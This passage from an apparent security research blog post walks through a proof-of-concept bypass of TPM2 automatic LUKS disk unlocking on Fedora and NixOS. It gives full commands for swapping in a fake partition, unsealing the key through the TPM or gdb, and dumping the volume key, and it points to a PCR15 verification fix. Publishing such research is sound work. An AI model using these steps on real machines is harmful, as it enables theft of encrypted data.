+</span></code></pre><h4 id="verifying-pcrs"><span><span><a href="#verifying-pcrs" aria-label="Anchor link for: verifying-pcrs">🔗</a></span> Verifying PCRs</span></h4><p>Now let&#39;s check whether any of the PCRs was affected by our
+operation:</p><pre data-lang="bash"><code data-lang="bash"><span>localhost:~#</span><span> tpm2_pcrread
+</span><span>  </span><span>sha1:
+</span><span>  </span><span>sha256:
+</span><span>    </span><span>0</span><span> : 0x8C2AF609E626CC1687F66EA6D0E1A3605A949319514A26E7E1A90D6A35646FA5
+</span><span>    </span><span>1</span><span> : 0x299B0462537A9505F6C63672B76A3502373C8934F08A921E1AA50D3ADF4BA83D
+</span><span>    </span><span>2</span><span> : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
+</span><span>    </span><span>3</span><span> : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
+</span><span>    </span><span>4</span><span> : 0x5FDBD66C267BD9513DBC569DB0B389A37445E1AA463F9325EA921563E7FB37EB
+</span><span>    </span><span>5</span><span> : 0x38A281376260137602E5C70F7A9057E4C55830D22A02BB5A66013D6AC2576D2F
+</span><span>    </span><span>6</span><span> : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
+</span><span>    </span><span>7</span><span> : 0x4770A4FB1DAC716FEADDD77FEC9A28BB2015E809A34ADD1A9D417EEC36EC1E17
+</span><span>    </span><span>8</span><span> : 0xE3E23C0DA36FA31767885AEC7AEE3180FB2F5E0B67569C3A82C2A1C3CA88A651
+</span><span>    </span><span>9</span><span> : 0x091F6917B0C8788779F4D410046250E6747043A8CD1BD75BF90713CC6DE30D99
+</span><span>    </span><span>10:</span><span> 0x2566BDF57C3AA880F7B0C480F479C0A88E0E72AE7EF3C1888035E7238BBE9257
+</span><span>    </span><span>11:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>    </span><span>12:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>    </span><span>13:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>    </span><span>14:</span><span> 0x17CDEFD9548F4383B67A37A901673BF3C8DED6F619D36C8007562DE1D93C81CC
+</span><span>    </span><span>15:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>    </span><span>16:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>    </span><span>17:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>18:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>19:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>20:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>21:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>22:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+</span><span>    </span><span>23:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
+</span><span>  </span><span>sha384:
+</span><span>  </span><span>sm3_256:
+</span></code></pre><p>The output format is slightly different to that of
+<code>systemd-analyze pcrs</code>, but we can see that all values
+are the same as in the real system. Some boards may have different
+values in PCR 1 after every power cycle, but don&#39;t worry, in that
+case you can be sure that the owner didn&#39;t use it either. So this
+means our attack was successful! We can now go ahead and retrieve
+the volume key of the original partition.</p><p>By quickly skimming <a href="https://github.com/latchset/clevis/blob/0839ee294a2cbb0c1ecf1749c9ca530ef9f59f8f/src/initramfs-tools/scripts/local-top/clevis.in#L78">the clevis source</a> we find that it stores a JWE token in the
+LUKS header, which contains an encrypted secondary key to unlock
+the partition. It also contains some metadata required to have it
+decrypted by the TPM, like which PCRs have to be used in the TPM
+context. Back when we inspected the LUKS header, we found the
+clevis token in slot 0, so let&#39;s first extract this token:</p><pre data-lang="bash"><code data-lang="bash"><span>localhost:~#</span><span> mount</span><span> -o</span><span> remount,rw / </span><span># This alpine image is not writable by default
+</span><span>localhost:~#</span><span> mount /dev/nvme0n1p1 /mnt
+</span><span>localhost:~#</span><span> cryptsetup token export</span><span> --token-id</span><span> 0 /mnt/luks-original.bak </span><span>| </span><span>tee</span><span> token.json
+</span><span>{
+</span><span>  </span><span>&#34;type&#34;</span><span>: </span><span>&#34;clevis&#34;</span><span>,
+</span><span>  </span><span>&#34;keyslots&#34;</span><span>:</span><span> [
+</span><span>    </span><span>&#34;1&#34;
+</span><span>  </span><span>],
+</span><span>  </span><span>&#34;jwe&#34;</span><span>: </span><span>{
+</span><span>    </span><span>&#34;ciphertext&#34;</span><span>: </span><span>&#34;hNNirkMsfcEWcVKfTFCY3JKNCk0x-8P4svgzkeulNhHnuaOdFQ4YfOCUUX9pkWvonfE2uivS&#34;</span><span>,
+</span><span>    </span><span>&#34;encrypted_key&#34;</span><span>: </span><span>&#34;&#34;</span><span>,
+</span><span>    </span><span>&#34;iv&#34;</span><span>: </span><span>&#34;5zuFP0kEuqiCh0QL&#34;</span><span>,
+</span><span>    </span><span>&#34;protected&#34;</span><span>: </span><span>&#34;eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwiY2xldmlzIjp7InBpbiI6InRwbTIiLCJ0cG0yIjp7Imhhc2giOiJzaGEyNTYiLCJqd2tfcHJpdiI6IkFOMEFJRXFpblRfb3Y5cTZHVFo3TU1TcW0tUXgzT1RNaEN6ZTVTUUxRTDhDbGNoakFCQ3Z5Tldyd2lZalRaVzZUNG1rSjd4UF9CeDlCa2N0UXFFZzF6eUZ4aTdMcTRBWTcxWnpGOEVrano3QmRlVWZ3TV9PT2pOdGVGcmZFdUItQzRONGRhWDZ0VHk3RTBrc3BuS3luN3VRQ0p6VDVrcU4yYkpPM0FGTEpwbG1JNWxseXhVdHNQZmRSamhSTFUyWXN6V2Fvay1VQlZsNGtuOWNHTUZCNFdZQmFHd01oM0QwZjF1TjdQUVV4cGx6bWtRSmQzX1FRUGZBM3VNMDZRcXY4OU14STVCc3dra3FiWEhSVmhNNFVCOXNLcjd0dzgzVkFFdXpzZ3c5OXciLCJqd2tfcHViIjoiQUU0QUNBQUxBQUFFa2dBZ2d1X2RMZTk2Z0dyRkZycWw2NXltWG5DQ1RMWWVMYXFkQ0NfSkRRa0R4M01BRUFBZ1UwVFhKaXZhaTVuWVNONGNUT05lNkNJR0djX2ZGbDd6ZlNsNUZuOTFvU0kiLCJrZXkiOiJlY2MiLCJwY3JfYmFuayI6InNoYTI1NiIsInBjcl9pZHMiOiI0LDUsNyw5In19fQ&#34;</span><span>,
+</span><span>    </span><span>&#34;tag&#34;</span><span>: </span><span>&#34;7DIhyL_ZNocrUHTPr1PQWg&#34;
+</span><span>  }
+</span><span>}
+</span></code></pre><p>Clevis would then proceed to extract a JWE token and hand it to
+<code>clevis-decrypt-tpm2</code> which decrypts it using the TPM,
+so we replicate the procedure:</p><pre data-lang="bash"><code data-lang="bash"><span># Get the contents of the .jwe field
+</span><span>localhost:~#</span><span> jose fmt</span><span> -j</span><span> token.json</span><span> -Og</span><span> jwe</span><span> -o- </span><span>| </span><span>tee</span><span> jwe.json
+</span><span>{
+</span><span>  </span><span>&#34;ciphertext&#34;</span><span>: </span><span>&#34;hNNirkMsfcEWcVKfTFCY3JKNCk0x-8P4svgzkeulNhHnuaOdFQ4YfOCUUX9pkWvonfE2uivS&#34;</span><span>,
+</span><span>  </span><span>&#34;encrypted_key&#34;</span><span>: </span><span>&#34;&#34;</span><span>,
+</span><span>  </span><span>&#34;iv&#34;</span><span>: </span><span>&#34;5zuFP0kEuqiCh0QL&#34;</span><span>,
+</span><span>  </span><span>&#34;protected&#34;</span><span>: </span><span>&#34;eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwiY2xldmlzIjp7InBpbiI6InRwbTIiLCJ0cG0yIjp7Imhhc2giOiJzaGEyNTYiLCJqd2tfcHJpdiI6IkFOMEFJRXFpblRfb3Y5cTZHVFo3TU1TcW0tUXgzT1RNaEN6ZTVTUUxRTDhDbGNoakFCQ3Z5Tldyd2lZalRaVzZUNG1rSjd4UF9CeDlCa2N0UXFFZzF6eUZ4aTdMcTRBWTcxWnpGOEVrano3QmRlVWZ3TV9PT2pOdGVGcmZFdUItQzRONGRhWDZ0VHk3RTBrc3BuS3luN3VRQ0p6VDVrcU4yYkpPM0FGTEpwbG1JNWxseXhVdHNQZmRSamhSTFUyWXN6V2Fvay1VQlZsNGtuOWNHTUZCNFdZQmFHd01oM0QwZjF1TjdQUVV4cGx6bWtRSmQzX1FRUGZBM3VNMDZRcXY4OU14STVCc3dra3FiWEhSVmhNNFVCOXNLcjd0dzgzVkFFdXpzZ3c5OXciLCJqd2tfcHViIjoiQUU0QUNBQUxBQUFFa2dBZ2d1X2RMZTk2Z0dyRkZycWw2NXltWG5DQ1RMWWVMYXFkQ0NfSkRRa0R4M01BRUFBZ1UwVFhKaXZhaTVuWVNONGNUT05lNkNJR0djX2ZGbDd6ZlNsNUZuOTFvU0kiLCJrZXkiOiJlY2MiLCJwY3JfYmFuayI6InNoYTI1NiIsInBjcl9pZHMiOiI0LDUsNyw5In19fQ&#34;</span><span>,
+</span><span>  </span><span>&#34;tag&#34;</span><span>: </span><span>&#34;7DIhyL_ZNocrUHTPr1PQWg&#34;
+</span><span>}
+</span><span>
+</span><span># Convert this format into the actual JWE token format
+</span><span>localhost:~#</span><span> jose jwe fmt</span><span> -i</span><span> jwe.json</span><span> -c </span><span>| </span><span>tee</span><span> token.txt
+</span><span>eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwiY2xldmlzIjp7InBpbiI6InRwbTIiLCJ0cG0yIjp7Imhhc2giOiJzaGEyNTYiLCJqd2tfcHJpdiI6IkFOMEFJRXFpblRfb3Y5cTZHVFo3TU1TcW0tUXgzT1RNaEN6ZTVTUUxRTDhDbGNoakFCQ3Z5Tldyd2lZalRaVzZUNG1rSjd4UF9CeDlCa2N0UXFFZzF6eUZ4aTdMcTRBWTcxWnpGOEVrano3QmRlVWZ3TV9PT2pOdGVGcmZFdUItQzRONGRhWDZ0VHk3RTBrc3BuS3luN3VRQ0p6VDVrcU4yYkpPM0FGTEpwbG1JNWxseXhVdHNQZmRSamhSTFUyWXN6V2Fvay1VQlZsNGtuOWNHTUZCNFdZQmFHd01oM0QwZjF1TjdQUVV4cGx6bWtRSmQzX1FRUGZBM3VNMDZRcXY4OU14STVCc3dra3FiWEhSVmhNNFVCOXNLcjd0dzgzVkFFdXpzZ3c5OXciLCJqd2tfcHViIjoiQUU0QUNBQUxBQUFFa2dBZ2d1X2RMZTk2Z0dyRkZycWw2NXltWG5DQ1RMWWVMYXFkQ0NfSkRRa0R4M01BRUFBZ1UwVFhKaXZhaTVuWVNONGNUT05lNkNJR0djX2ZGbDd6ZlNsNUZuOTFvU0kiLCJrZXkiOiJlY2MiLCJwY3JfYmFuayI6InNoYTI1NiIsInBjcl9pZHMiOiI0LDUsNyw5In19fQ..5zuFP0kEuqiCh0QL.hNNirkMsfcEWcVKfTFCY3JKNCk0x-8P4svgzkeulNhHnuaOdFQ4YfOCUUX9pkWvonfE2uivS.7DIhyL_ZNocrUHTPr1PQWg
+</span><span>
+</span><span># Use the clevis-decrypt-tpm2 script to decrypt it with the TPM2
+</span><span>localhost:~#</span><span> cat token.txt </span><span>| </span><span>tr -d </span><span>&#39;\n&#39; </span><span>| </span><span>clevis-decrypt-tpm2
+</span><span>4yurbtxybpBwHBi2O2Kea1vDmhjDRt6yudAKYXinsiI3EUSjwYhwZA
+</span></code></pre><p>Awesome! We got a password out of it, which is the password
+<code>clevis</code> originally added to the LUKS partition and
+which can be used to unlock it! Let&#39;s also dump the volume key for
+future &#34;safekeeping&#34; 🤡:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /mnt/luks-original.bak</span><span> --dump-volume-key --volume-key-file</span><span> volume-key.txt \
+</span><span>                    --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 4yurbtxybpBwHBi2O2Kea1vDmhjDRt6yudAKYXinsiI3EUSjwYhwZA)
+</span><span># [...]
+</span><span>Are</span><span> you sure</span><span>?</span><span> (Type </span><span>&#39;yes&#39;</span><span> in capital letters)</span><span>:</span><span> YES
+</span><span>LUKS</span><span> header information for /mnt/luks-original.bak
+</span><span>Cipher</span><span> name:    aes
+</span><span>Cipher</span><span> mode:    xts-plain64
+</span><span>Payload</span><span> offset: 32768
+</span><span>UUID:</span><span>           779328d5-00ca-4ade-be44-6daa549642ed
+</span><span>MK</span><span> bits:        512
+</span><span>Key</span><span> stored to file volume-key.txt.
+</span><span>
+</span><span>[root@localhost]#</span><span> cat volume-key.txt </span><span>| </span><span>hexdump
+</span><span>0000000</span><span> 0e42 f904 ae92 97a2 84a0 920a 3b09 faf5
+</span><span>0000010</span><span> 4feb 1775 b0de 0448 e4f4 c57f 35e6 7e34
+</span><span>0000020</span><span> d200 2016 8623 2cd2 5e8e 2262 320a 3e74
+</span><span>0000030</span><span> 6411 6454 866a d81e 88ff 8dbf b70b 9eef
+</span><span>0000040
+</span></code></pre><p>At this point we only have to restore the partition to its
+original state and decrypt the real partition. We can either reboot
+into a live system (possible if the Microsoft keys are still in the
+secure boot database) or put the disk back into a system we
+control. Finally, we can mount the encrypted disk to have a look
+inside:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> dd if=/mnt/luks-original.bak of=/dev/nvme0n1p3 bs=64M count=1
+</span><span>[root@localhost]#</span><span> cryptsetup luksOpen /dev/nvme0n1p3 original \
+</span><span>                    --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 4yurbtxybpBwHBi2O2Kea1vDmhjDRt6yudAKYXinsiI3EUSjwYhwZA)
+</span><span>[root@localhost]#</span><span> mount /dev/mapper/original /mnt
+</span><span>[root@localhost]#</span><span> cat /mnt/etc/os-release
+</span><span>NAME</span><span>=</span><span>&#34;Fedora Linux&#34;
+</span><span>VERSION</span><span>=</span><span>&#34;41 (Server Edition)&#34;
+</span><span>RELEASE_TYPE</span><span>=</span><span>stable
+</span><span>ID</span><span>=</span><span>fedora
+</span><span>VERSION_ID</span><span>=</span><span>41
+</span><span>VERSION_CODENAME</span><span>=</span><span>&#34;&#34;
+</span><span>PLATFORM_ID</span><span>=</span><span>&#34;platform:f41&#34;
+</span><span>PRETTY_NAME</span><span>=</span><span>&#34;Fedora Linux 41 (Server Edition)&#34;
+</span><span>ANSI_COLOR</span><span>=</span><span>&#34;0;38;2;60;110;180&#34;
+</span><span>LOGO</span><span>=</span><span>fedora-logo-icon
+</span><span>CPE_NAME</span><span>=</span><span>&#34;cpe:/o:fedoraproject:fedora:41&#34;
+</span><span>HOME_URL</span><span>=</span><span>&#34;https://fedoraproject.org/&#34;
+</span><span>DOCUMENTATION_URL</span><span>=</span><span>&#34;https://docs.fedoraproject.org/en-US/fedora/f41/system-administrators-guide/&#34;
+</span><span>SUPPORT_URL</span><span>=</span><span>&#34;https://ask.fedoraproject.org/&#34;
+</span><span>BUG_REPORT_URL</span><span>=</span><span>&#34;https://bugzilla.redhat.com/&#34;
+</span><span>REDHAT_BUGZILLA_PRODUCT</span><span>=</span><span>&#34;Fedora&#34;
+</span><span>REDHAT_BUGZILLA_PRODUCT_VERSION</span><span>=</span><span>41
+</span><span>REDHAT_SUPPORT_PRODUCT</span><span>=</span><span>&#34;Fedora&#34;
+</span><span>REDHAT_SUPPORT_PRODUCT_VERSION</span><span>=</span><span>41
+</span><span>SUPPORT_END</span><span>=</span><span>2025-05-13
+</span><span>VARIANT</span><span>=</span><span>&#34;Server Edition&#34;
+</span><span>VARIANT_ID</span><span>=</span><span>server
+</span></code></pre><p>Success! Apart from researching all of the tools and their
+internals this has been a rather simple process. I would even claim
+that with some preparation we can repeat this reliably in under 10
+minutes. All it takes is two disk swaps and a few reboots.</p><p><em>Finally I can rest easy knowing that my roommate can make a
+surprise backup of my server&#39;s data while I&#39;m away 🎉. A solid
+3-2-1(+1) strategy.</em></p><h2 id="proof-of-concept-exploitation-of-a-nixos-machine"><span><span><a href="#proof-of-concept-exploitation-of-a-nixos-machine" aria-label="Anchor link for: proof-of-concept-exploitation-of-a-nixos-machine">🔗</a></span> Proof-of-concept exploitation of a NixOS machine</span></h2><p><em>This will be very similar to the previous PoC, so I skipped
+a lot of the boilerplate this time. If you are not specifically
+interested in NixOS or systemd-cryptenroll, you can jump to the
+next section <a href="https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/#what-now">by clicking here</a>.</em></p><p>Secure boot on NixOS is currently implemented by the awesome
+<a href="https://github.com/nix-community/lanzaboote">lanzaboote</a>
+project, which does some things differently than what we just saw
+on Fedora. Most notably we will enroll our own secure boot keys
+(and can wipe the microsoft keys), our kernel and initrd will both
+be fully signed as a UKI image and systemd-boot will not allow you
+to edit the command line. Another small difference to the Fedora
+setup is that we will use <code>systemd-cryptenroll</code> instead
+of <code>clevis</code>.</p><p>In any case, the overall exploitation will be very similar, the
+NixOS initrd also doesn&#39;t verify LUKS identities (as of January
+2025).</p><h4 id="system-setup"><span><span><a href="#system-setup" aria-label="Anchor link for: system-setup">🔗</a></span> System setup</span></h4><p>Fortunately, the setup is extremely simple with lanzaboote. I
+recommend having a look at their <a href="https://github.com/nix-community/lanzaboote/blob/master/docs/QUICK_START.md">Quick Start Guide</a> in case you don&#39;t know the project already.
+I&#39;ve added the full configuration of the test machine <a href="https://oddlama.org/bypassing-disk-encryption/flake.nix">here</a>, in case you want
+to replicate this. The final setup steps were:</p><pre data-lang="bash"><code data-lang="bash"><span># Clear secure boot keys, start nixos live image, copy flake to live image, then:
+</span><span>[root@nixos]#</span><span> alias nix=</span><span>&#39;nix --experimental-features &#34;nix-command flakes&#34;&#39;
+</span><span>[root@nixos]#</span><span> nix build</span><span> --print-out-paths</span><span> .#nixosConfigurations.nixos.config.system.build.diskoScript
+</span><span>/nix/store/1a51ykfsdnc0rpzlawyy7rvb889l6874-disko
+</span><span>[root@nixos]#</span><span> nix build</span><span> --print-out-paths</span><span> .#nixosConfigurations.nixos.config.system.build.toplevel
+</span><span>/nix/store/5yqhbkqqw1kcr13157z4am1r5i02ll0d-nixos-system-nixos-25.05.20250110.130595e
+</span><span>
+</span><span># Format and install:
+</span><span>[root@nixos]#</span><span> /nix/store/1a51ykfsdnc0rpzlawyy7rvb889l6874-disko  </span><span># Format disk(s)
+</span><span>[root@nixos]#</span><span> nixos-install</span><span> --no-root-password --system </span><span>\        </span><span># Install system
+</span><span>                </span><span>/nix/store/5yqhbkqqw1kcr13157z4am1r5i02ll0d-nixos-system-nixos-25.05.20250110.130595e
+</span><span>[root@nixos]#</span><span> nixos-enter</span><span> --mountpoint</span><span> /mnt</span><span> --</span><span> sbctl create-keys </span><span># Create and enroll secure boot keys, need to rerun install afterwards to make lanzaboote happy
+</span><span>
+</span><span># Reboot and enroll LUKS key:
+</span><span>[root@nixos]#</span><span> systemd-cryptenroll /dev/disk/by-partlabel/disk-main-luks</span><span> --tpm2-device</span><span>=</span><span>auto</span><span> --tpm2-pcrs</span><span>=</span><span>0+2+4+7
+</span><span># ... Enter password ...
+</span><span>New</span><span> TPM2 token enrolled as key slot 1.
+</span></code></pre><h4 id="inspecting-the-system-1"><span><span><a href="#inspecting-the-system-1" aria-label="Anchor link for: inspecting-the-system-1">🔗</a></span> Inspecting the system</span></h4><p>This step works in the same was as it did for Fedora, but we
+will find that the NixOS initrd works a bit differently - it itself
+is a kind of mini-NixOS. The important information is the
+following:</p><ul><li>The mount commands for filesystems are in systemd units, which
+usually use UUIDs, labels or partlables to identify disks. In our
+case it will be partlabels, so we don&#39;t even have to fake any
+UUIDs.</li><li>Once the initrd decrypts the root partition, it searches for
+the toplevel derivation by resolving the
+<code>init=/nix/store/&lt;hash&gt;-nixos-system-.../init</code>
+path</li><li>This toplevel derivation contains a <code>prepare-root</code>
+binary which is the first one that is executed. This is our entry
+point.</li></ul><h4 id="luks-partition-backup-and-overwrite"><span><span><a href="#luks-partition-backup-and-overwrite" aria-label="Anchor link for: luks-partition-backup-and-overwrite">🔗</a></span>
+LUKS partition backup and overwrite</span></h4><p>Next, we overwrite the LUKS partition and overwrite it with our
+fake. We can reuse the same fake partition with the Alpine image as
+on Fedora as it has the advantage of being very small. If the user
+has <code>/nix</code> on a separate partition it may be simpler to
+just build a small NixOS system and link the resulting toplevel
+derivation to the path expected by the initrd.</p><p>Rebooting the original system with the modified disk will now
+yield an Alpine root shell. After running <code>tpm2_pcrread</code>
+we can verify that we have not changed any PCRs with our
+modifications. To understand the differences of
+<code>systemd-cryptenroll</code> over <code>clevis</code>, let&#39;s
+continue with some more detail from here:</p><p>Once again we will inspect the LUKS header of our backup, which
+I&#39;ve also copied over to the boot partition for easy access. We see
+that <code>systemd-cryptenroll</code> creates a token in the LUKS
+header, similar to <code>clevis</code>:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /mnt/luks-original.bak
+</span><span>LUKS</span><span> header information
+</span><span>Version:</span><span>        2
+</span><span>Epoch:</span><span>          6
+</span><span>Metadata</span><span> area:  16384 </span><span>[</span><span>bytes</span><span>]
+</span><span>Keyslots</span><span> area:  16744448 </span><span>[</span><span>bytes</span><span>]
+</span><span>UUID:</span><span>           5a9d9566-aae2-49b9-abf5-c6f0a887159c
+</span><span># [...]
+</span><span>Tokens:
+</span><span>  </span><span>0:</span><span> systemd-tpm2
+</span><span>    </span><span>Keyslot:</span><span>    1
+</span><span># [...]
+</span><span>
+</span><span>[root@localhost]#</span><span> cryptsetup token export</span><span> --token-id</span><span> 0 /mnt/luks-original.bak </span><span>| </span><span>tee</span><span> token.json
+</span><span>{
+</span><span>  </span><span>&#34;type&#34;</span><span>: </span><span>&#34;systemd-tpm2&#34;</span><span>,
+</span><span>  </span><span>&#34;keyslots&#34;</span><span>: </span><span>[ </span><span>&#34;1&#34; </span><span>]</span><span>,
+</span><span>  </span><span>&#34;tpm2-blob&#34;</span><span>: </span><span>&#34;AJ4AIPtjVjiz90zIPEHgRoJVpsix/e1tBRaMkOv0tWEBBKegABC5vMp9mQt81TjlRmtEhca98VfRuXxAoYcB5yjzShhTZhfCzwgXpC7rd5TETxBhvtWbo4BQULmZT29InkqpXRaO/b7DyXqLDQusdAfQO/lQSVxwWjVR576OFJUvAMPN6XEVyH8jDFd+F5FtuaEsYS4t46ThxMWa10ttRwBOAAgACwAABBIAIE8jssxPAKj8Duc+hrtEmIZxQS0Hv3Uptj92Ud33KVpBABAAIDBubaOpjc3KX/Lj0jHbe9plgv9wTIKYsUtFCKOGotRU&#34;</span><span>,
+</span><span>  </span><span>&#34;tpm2-pcrs&#34;</span><span>: </span><span>[</span><span> 0, 2, 4, 7 </span><span>]</span><span>,
+</span><span>  </span><span>&#34;tpm2-pcr-bank&#34;</span><span>: </span><span>&#34;sha256&#34;</span><span>,
+</span><span>  </span><span>&#34;tpm2-policy-hash&#34;</span><span>: </span><span>&#34;4f23b2cc4f00a8fc0ee73e86bb44988671412d07bf7529b63f7651ddf7295a41&#34;</span><span>,
+</span><span>  </span><span>&#34;tpm2_srk&#34;</span><span>: </span><span>&#34;gQAAAQAiAAt+KklPEEbTTiWnmjC8TapUFILGmpUxJHOLyhfoPjJpFwAAAAEAWgAjAAsAAwRyAAAABgCAAEMAEAADABAAIB/V/x4OEuiI/TAynXAqG6pJHrJH9GJoEtgjqa+C0AlkACDBNasZylLB/v5PdYsWfJgE/MXZeUi2LMVE/FXfbsyDAw==&#34;
+</span><span>}
+</span></code></pre><p>The token format is slightly different to that from
+<code>clevis</code>, it just contains all necessarey information on
+the toplevel without a roundtrip through JWE. To understand how the
+values are supposed to be used, we need to understand what
+<code>systemd-cryptenroll</code> does to unlock the disk. In the
+systemd source code we find that the responsible function is called
+<a href="https://github.com/systemd/systemd/blob/main/src/cryptsetup/cryptsetup.c#L1834"><code>static int tpm2_unseal(...)</code></a>. Instead of tediously
+replicating all the unmarshalling logic, we can just call
+<code>systemd-cryptsetup</code> through gdb and dump the decrypted
+secret after that function was called:</p><pre data-lang="bash"><code data-lang="bash"><span>gdb --args</span><span> systemd-cryptsetup attach test /mnt/luks-original.img
+</span><span># [...]
+</span><span>(</span><span>gdb</span><span>) break tpm2_unseal
+</span><span>Function </span><span>&#34;tpm2_unseal&#34;</span><span> not defined.
+</span><span>Make</span><span> breakpoint pending on future shared library load</span><span>?</span><span> (y or </span><span>[</span><span>n</span><span>]</span><span>) </span><span>y
+</span><span>Breakpoint</span><span> 1 (tpm2_unseal) </span><span>pending.
+</span><span>(</span><span>gdb</span><span>) run
+</span><span>Breakpoint</span><span> 1, 0x00007ffff7bb2f90 in tpm2_unseal ()
+</span><span>(</span><span>gdb</span><span>) backtrace
+</span><span>#0  0x00007ffff7bb2f90 in tpm2_unseal () from libsystemd-shared-256.so
+</span><span>#1  0x00007ffff721d7e7 in acquire_luks2_key () from libcryptsetup-token-systemd-tpm2.so
+</span><span>#2  0x00007ffff721c60f in cryptsetup_token_open_pin () from libcryptsetup-token-systemd-tpm2.so
+</span><span>#3  0x00007ffff721caf5 in cryptsetup_token_open () from libcryptsetup-token-systemd-tpm2.so
+</span><span># ...
+</span></code></pre><p>By investigating the functions shown in the callstack, we see
+that right before <a href="https://github.com/systemd/systemd/blob/cc7300fc5868f6d47f3f47076100b574bf54e58d/src/cryptsetup/cryptsetup-tokens/cryptsetup-token-systemd-tpm2.c#L35"><code>cryptsetup_token_open_pin()</code></a> returns, it base64
+encodes the unsealed secret which is later used as the slot 1 LUKS
+password. So we just set a breakpoint to the base64 encoding
+function and print the secret once it returns (the result pointer
+is the third argument, so it will be passed via
+<code>rcx</code>):</p><pre data-lang="bash"><code data-lang="bash"><span>(</span><span>gdb</span><span>) break base64mem_full
+</span><span>(</span><span>gdb</span><span>) continue
+</span><span>(</span><span>gdb</span><span>) info registers
+</span><span># ...
+</span><span>rcx</span><span>            0x7fffffffc920      140737488341280 </span><span># pointer to base64 result
+</span><span># ...
+</span><span>(</span><span>gdb</span><span>) set $</span><span>a</span><span> = $</span><span>rcx </span><span># remember where the result will be stored
+</span><span>(</span><span>gdb</span><span>) finish
+</span><span>(</span><span>gdb</span><span>) printf </span><span>&#34;%s\n&#34;</span><span>, </span><span>*</span><span>(char</span><span>**</span><span>)$</span><span>a
+</span><span>qvramS8M9tetETI1I53p6HWqh1avSqsj/uqpQbvE90s</span><span>=
+</span></code></pre><p>Let&#39;s test this password by dumping the volume key.</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /mnt/luks-original.bak</span><span> --dump-volume-key --volume-key-file</span><span> volume-key.txt \
+</span><span>                    --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n </span><span>&#34;qvramS8M9tetETI1I53p6HWqh1avSqsj/uqpQbvE90s=&#34;</span><span>)
+</span><span># [...]
+</span><span>Are</span><span> you sure</span><span>?</span><span> (Type </span><span>&#39;yes&#39;</span><span> in capital letters)</span><span>:</span><span> YES
+</span><span>LUKS</span><span> header information for copy.img
+</span><span>Cipher</span><span> name:    aes
+</span><span>Cipher</span><span> mode:    xts-plain64
+</span><span>Payload</span><span> offset: 32768
+</span><span>UUID:</span><span>           5a9d9566-aae2-49b9-abf5-c6f0a887159c
+</span><span>MK</span><span> bits:        512
+</span><span>Key</span><span> stored to file volume-key.txt.
+</span><span>
+</span><span>[root@localhost]#</span><span> cat volume-key.txt </span><span>| </span><span>hexdump
+</span><span>0000000</span><span> 065a cc94 26c0 b0cc 4bcf bf73 e9bb 3c16
+</span><span>0000010</span><span> 95da 149e 6881 1a5b e7f5 4b59 4bc9 db83
+</span><span>0000020</span><span> 6008 d237 29a8 9fc7 7a83 dbbf 816e 5ad0
+</span><span>0000030</span><span> 20fa 03f6 effd 39f5 1f78 8779 c501 35b6
+</span><span>0000040
+</span></code></pre><p>Nice, we&#39;ve successfully extracted the volume key again!
+Finally, we need to restore the original disk header and are then
+able to decrypt the whole disk. We can either decrypt it by
+specifying the volume key explicitly, or simply enter the obtained
+password. Since this is exactly the same as on Fedora, I have not
+included it here.</p><h4 id="crude-implementation-of-pcr15-verification"><span><span><a href="#crude-implementation-of-pcr15-verification" aria-label="Anchor link for: crude-implementation-of-pcr15-verification">🔗</a></span>
+Crude implementation of PCR15 verification</span></h4><p>I&#39;ve looked at all of this together with my friend <a href="https://github.com/patrickdag">@PatrickDaG</a>, who has quickly
+written <a href="https://forge.lel.lol/patrick/nix-config/src/commit/ab2cb2b4d554040ce208fc60624fe729a9d5e32b/modules/ensure-pcr.nix">a NixOS module</a> which you can adapt to add a crude form of PCR
+15 verification. Ideally we need something proper upstreamed into
+nixpkgs, but ensuring the order of decryption is not super
+simple.</p><h2 id="what-now"><span><span><a href="#what-now" aria-label="Anchor link for: what-now">🔗</a></span> What now?</span></h2><p>It&#39;s obviously a pity that the default initrd implementations
+available on most distributions don&#39;t include a verification step
+out of the box. But there&#39;s really nobody to blame here, as none of
+the distributions advertise automatic TPM unlocking as a secure or
+even supported configuration, and the guides I&#39;ve linked to are
+mostly blog posts from other hobbyists - who may just not have
